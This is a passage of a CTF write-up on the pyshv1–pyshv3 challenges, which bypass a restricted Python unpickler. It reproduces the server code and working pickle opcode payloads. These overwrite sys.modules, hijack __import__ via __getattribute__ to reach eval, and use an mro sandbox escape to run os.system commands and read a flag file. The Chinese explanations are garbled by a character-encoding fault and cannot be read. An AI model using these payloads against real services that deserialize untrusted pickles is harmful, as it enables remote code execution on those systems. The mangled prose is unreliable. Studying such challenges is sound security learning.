sys<br><br>whitelist = []<br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;sys&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br></code></pre></td></tr></table></figure>
<p>ÈôêÂà∂Êù°‰ª∂Â¶Ç‰∏ãÔºö</p>
<ol type="1">
<li>Âè™ËÉΩÂºïÂÖ• sys Ê®°Âùó</li>
<li>ÊñπÊ≥ï‰∏≠‰∏çËÉΩÊúâ <code>.</code></li>
</ol>
<p>ËøôÈ¢òÊØîËæÉÁÆÄÂçïÔºåÂà©Áî®ÊñπÊ≥ïË¶ÜÁõñÁöÑÊÄùË∑ØÔºå<code>sys.modules.get("os").system("whoami")</code> Â∞±ÂèØ‰ª•‰∫ÜÔºåËΩ¨‰∏∫ opcode Âç≥‰∏∫Ôºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR  # Âà∞ËøôÈáåÂíå‰∏äÈù¢ÊñπÊ≥ïË¶ÜÁõñ‰∏≠ÁöÑ payload ‰∏ÄÊ†∑<br>p1<span class="hljs-symbol">\n</span>0  # Êää os Â≠ò‰∏ãÊù•ÂÖàÔºåÁÑ∂ÂêéÊ∏ÖÁ©∫Ê†à<br>g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g1<span class="hljs-symbol">\n</span>s   # ÂºïÂÖ• sys.modules Âπ∂‰ª§ sys.modules[&quot;sys&quot;] = osÔºåËøô‰∏™ÊÄùË∑ØËøòÊòØÊñπÊ≥ïË¶ÜÁõñ<br>csys<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>tR.  # ÊâßË°åÂëΩ‰ª§<br></code></pre></td></tr></table></figure></p>
<p>Âú®ÁªèËøá‰∏§ËΩÆË¶ÜÁõñ sys ‰πãÂêéÔºåÂ∞±ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§‰∫ÜÔºö<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b27d5d62-53a7-4aab-9505-289c28ddca40.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h3 id="pyshv2">pyshv2</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- structs.py ----- </span><br><span class="hljs-comment"># structs.py ÊòØ‰∏Ä‰∏™Á©∫Êñá‰ª∂</span><br><br><br><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br></code></pre></td></tr></table></figure>
<p>ËøôÈÅìÈ¢òÈöæÂ∫¶ÊèêÂçá‰∫Ü‰∏çÂ∞ë„ÄÇÈôêÂà∂Â¶Ç‰∏ãÔºö</p>
<ol type="1">
<li>Âè™ËÉΩÂºïÂÖ• structs Ê®°Âùó</li>
<li>ÊñπÊ≥ï‰∏≠‰∏çËÉΩÊúâ <code>.</code></li>
</ol>
<p>‰∏ä‰∏ÄÈÅìÈ¢òÂà©Áî®ÊñπÊ≥ïË¶ÜÁõñÔºå‰æùËµñÁöÑÊòØÂèØÂºïÂÖ•Ê®°Âùó‰∏≠ÁöÑÊüê‰∫õÁâπÊÆäÊñπÊ≥ï„ÄÇÊàë‰ª¨ÂÖàÊù•Áúã‰∏ã <code>structs</code> ÈÉΩÊúâÂì™‰∫õÂ±ûÊÄßÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/58557963-7381-4e39-bfa1-d4bdcfcebee8.png!blog#width-zoom2" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÂÜçÁúã‰∏ãÈÉΩÊúâÂì™‰∫õÊñπÊ≥ïÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/e400d051-3362-46e3-af15-d0095180097f.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p><code>__builtins__</code>„ÄÅ<code>__getattribute__</code> ÈÉΩÊòØÂ•Ω‰∏úË•ø„ÄÇ</p>
<p>ÊÄùË∑ØÈ¶ñÂÖàÂèØ‰ª•ÊòØ <code>structs.__builtins__["eval"]("__import__('os').system('whoami')")</code>ÔºåÂèØÊòØËøôÈáåÁöÑ <code>"eval"</code> ÊòØ‰∏çÂ•Ω get ÁöÑ„ÄÇ</p>
<p>Êàë‰ª¨ÂèØ‰ª•‰ªéÂêéÂæÄÂâçÊé®„ÄÇ</p>
<p><code>("__import__('os').system('whoami')")</code>ÔºåËøô‰∏™Â•ΩËß£ÂÜ≥ÔºåÁî® <code>c</code> Â∞±Ë°å‰∫Ü„ÄÇÈáçÁÇπÊòØ <code>structs.__builtins__["eval"]</code> Ëøô‰∏™ÊÄé‰πàÊêûÂá∫Êù•„ÄÇÁî±‰∫éËá™ÂÆö‰πâÁöÑ find_class Áî®Âà∞‰∫Ü <code>__import__</code>ÔºåÊâÄ‰ª• <code>cstructs\n__builtins__</code> Â∞±‰ºöÊâßË°å <code>__import__("structs")</code>„ÄÇÈÇ£‰πàÂèØ‰ª•ËøôÊ†∑ÔºåÈ¶ñÂÖàÔºåÁªô structs Âä†‰∏Ä‰∏™Â±ûÊÄßÔºö<code>structs.__dict__["p0"] = structs.__builtins__</code>ÔºåÂÜçËß£ÂºÄ‰∏ÄÂ±ÇÔºåÁªô structs Âä†‰∏Ä‰∏™Â±ûÊÄßÔºö<code>structs.__dict__["p1"] = structs.__dict__["p0"].get</code>ÔºåÈÇ£‰πà <code>cstructs\np1\n(Veval\ntR.</code> Â∞±‰ºöÊâßË°å <code>structs.__builtins__.get("eval")</code>ÔºåÊâÄ‰ª•ËøôÈáåÁöÑ opcode Â∞±ÊòØÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cstructs<span class="hljs-symbol">\n</span>__dict__<span class="hljs-symbol">\n</span>p0<br>(Vp0<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>__builtins__<span class="hljs-symbol">\n</span>s<br>(Vp1<span class="hljs-symbol">\n</span>g0.get<span class="hljs-symbol">\n</span>s  # ËøôÈáåÊòØ‰∏çË°åÁöÑ<br>cstructs<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>(Veval<span class="hljs-symbol">\n</span>tR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure><br />
ÈÅóÊÜæÁöÑÊòØÔºåopcode ÊòØ‰∏çÊîØÊåÅÁî® <code>.</code> Êù•ÂèñÂ±ûÊÄß/ÊñπÊ≥ïÁöÑ„ÄÇ</p>
<p>ÊâÄ‰ª•Áé∞Âú®ÁöÑÈóÆÈ¢òÂ∞±ÂèòÊàê‰∫ÜÔºå<code>.get</code> Ëøô‰∏™ÊñπÊ≥ïÊÄé‰πàÊêûÂá∫Êù•„ÄÇ</p>
<p>ÂÜçÁúã‰∏ã find_classÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">module = <span class="hljs-built_in">__import__</span>(module)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br></code></pre></td></tr></table></figure></p>
<p>ÊâÄ‰ª•Â¶ÇÊûú module ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÁöÑËØùÔºåÈÇ£‰πà name Â∞±ÂèØ‰ª•ÁΩÆ‰∏∫ getÔºåÂç≥ <code>__import__("structs")</code> ÁöÑÁªìÊûúÂ∫îËØ•ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏„ÄÇËÄå <code>__import__</code> ÊòØÂèØ‰ª•Ë¢´ÊõøÊç¢ÁöÑÔºå<code>__getattribute__</code> Â∞±Ê¥æ‰∏ä‰∫ÜÁî®Âú∫Ôºå‰ª§ <code>structs.__builtins__['__import__'] = structs.__getattribute__</code>„ÄÇÊâÄ‰ª•ÔºåÊàë‰ª¨ËøòÂæóÁªô structs Êñ∞Â¢û‰∏Ä‰∏™ structs Â±ûÊÄßÔºö<code>structs.__dict__["structs"] = structs.__builtins__</code>„ÄÇ</p>
<p>Âà∞ËøôÈáå:<br />
<code>__import__(module)</code> Á≠â‰∫é<br />
<code>structs.__getattribute__("structs")</code> Á≠â‰∫é<br />
<code>structs.__builtins__</code></p>
<p>ÊâÄ‰ª• module Â∑≤ÁªèÊòØ <code>structs.__builtins__</code> ‰∫ÜÔºåÂè™ÈúÄË¶ÅËÆ© <code>name = "get"</code> Âç≥ÂèØÊãøÂà∞ <code>eval</code>Ôºö<br />
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># get flag</span><br><br><span class="hljs-section"># Êî∂Â∑•</span><br>\ntR.<br></code></pre></td></tr></table></figure></p>
<p>ËøôÊ†∑Âç≥ÂèØËé∑Âæó flag<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> structs<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = [<span class="hljs-string">&quot;structs&quot;</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br>dumps = pickle.dumps<br><br>a = <span class="hljs-string">b&#x27;&#x27;&#x27;cstructs\n__dict__\nVstructs\ncstructs\n__builtins__\ns0cstructs\n__builtins__\nV__import__\ncstructs\n__getattribute__\ns0cstructs\nget\n(Veval\ntR(&#x27;&#x27;&#x27;</span> + \<br>    <span class="hljs-string">b&#x27;&#x27;&#x27;Vprint(open(&quot;./flag&quot;).read())\ntR.&#x27;&#x27;&#x27;</span><br>b = RestrictedUnpickler(io.BytesIO(a)).load()<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7803561-799c-4c0d-9e25-cee4ed6ac81d.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>Â¶ÇÊûúÂè™ÊòØ‰∏∫‰∫ÜÊãøÂà∞ flagÔºåÁî® <code>open("./flag").read()</code> ‰πüÂèØ‰ª•„ÄÇ‰ΩÜÊàë‰ª¨ÊÄªÊòØ‰ºöÊÉ≥ÊÉ≥ËÉΩ‰∏çËÉΩ RCEÔºåÈÇ£‰πàËøôÈÅìÈ¢òÂèØ‰ª• RCE ÂêóÔºü‰Ω†ÂèØËÉΩ‰ºöÊÉ≥Ôºåopcode ÈáåÈù¢Â∑≤ÁªèÊää <code>__import__</code> Ê±°Êüì‰∫ÜÔºåÊâÄ‰ª•Ê≤°Ê≥ï import ÂÖ∂‰ªñÁöÑÂåÖÊù• RCE„ÄÇ</p>
<p>ÂÆûÈôÖ‰∏äÊòØÂèØ‰ª•ÁöÑ„ÄÇÂêåÊ†∑ÔºåÂú®Êàë‰πãÂâçÂÜôÁöÑ„ÄäPython Ê≤ôÁÆ±ÈÄÉÈÄ∏ÁöÑÁªèÈ™åÊÄªÁªì„ÄãÔºàËßÅËµÑÊñô 1ÔºâÈáåÊúâÁî® mro Êù•ÂÆûÁé∞Êó† import ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÁöÑÊñπÊ≥ï„ÄÇÊàëËøôÈáåÂ∞±‰∏çÂï∞Âó¶‰∫ÜÔºåÁõ¥Êé•ÁªôÂá∫ opcodeÔºö<br />
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># Âà©Áî® mro ÂØªÊâæÂèØÂà©Áî®ÁöÑÊ®°ÂùóÔºåËøôÈáå‰ª• sys ‰∏∫‰æã</span><br>[<span class="hljs-string">x for x in [</span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() if x.<span class="hljs-strong">__name__</span> == &quot;<span class="hljs-emphasis">_Printer&quot;][0]._</span>Printer<span class="hljs-strong">__setup.__</span>globals<span class="hljs-strong">__[&#x27;sys&#x27;].modules.get(&quot;os&quot;).system(&quot;whoami&quot;)</span><br><span class="hljs-strong"></span><br><span class="hljs-strong"># Êî∂Â∑•</span><br><span class="hljs-strong">\ntR.</span><br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34d78bf0-8b15-40ec-9119-63a6f7bc15b9.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h3 id="pyshv3">pyshv3</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> os<br><br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.key = os.urandom(<span class="hljs-number">100</span>)<br>        <span class="hljs-variable 